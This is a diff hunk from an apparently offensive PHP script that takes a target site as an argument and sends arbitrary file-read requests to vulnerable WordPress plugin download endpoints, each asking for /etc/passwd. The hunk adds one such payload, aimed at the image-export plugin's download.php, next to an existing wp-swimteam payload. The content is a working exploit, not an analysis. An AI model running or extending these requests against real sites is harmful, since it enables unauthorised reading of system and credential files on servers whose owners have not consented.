@@ -273,6 +273,8 @@ __request($argv[1], '/wp-content/plugins/wp-ecommerce-shop-styling/includes/down
 
 __request($argv[1], '/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress');
 
+__request($argv[1], '/wp-content/plugins/image-export/download.php?file=/etc/passwd');
+
 function __request($url, $plugin) {
 
     $objcurl = curl_init();
